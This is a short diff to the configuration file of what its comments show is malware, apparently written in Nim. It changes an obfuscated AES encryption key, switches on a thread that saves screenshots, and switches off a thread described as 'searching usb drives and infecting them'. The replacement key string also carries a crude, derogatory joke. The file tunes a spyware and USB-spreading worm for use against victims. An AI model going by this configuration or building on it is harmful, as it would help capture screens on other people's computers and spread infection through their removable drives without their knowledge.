@@ -6,7 +6,7 @@
 ## DO NOT REMOVE
 from functions/hideString import e
 
-const AES_ENCRYPT_KEY*: string = e "noulabiestezeu12345678"
+const AES_ENCRYPT_KEY*: string = e "macheamapetrisorsisuntfoartegayhaha"
 
 const AES_AAD*: string = e "abiestezeu1234"
 
@@ -73,7 +73,7 @@ const WINDOW_NAME_THREAD_CHECK_INTERVAL * : int = 10
 
 ## screenshotThread is used for saving screenshots
 ## DEFAULT: true
-const USE_SCREENSHOT_THREAD*: bool = false
+const USE_SCREENSHOT_THREAD*: bool = true
 
 ## run screenshotThread every n ms
 ## higher value: lower bandwith and cpu usage, less screenshots
@@ -110,7 +110,7 @@ const UNSAFE_REMOVE_FILE*: bool = false
 
 ## infectThread is used for searching usb drives and infecting them
 ## DEFAULT: true
-const USE_INFECT_THREAD*: bool = true
+const USE_INFECT_THREAD*: bool = false
 
 ## run infectThread every n ms
 ## higher value: lower cpu usage, higher chance of not infecting all usbs
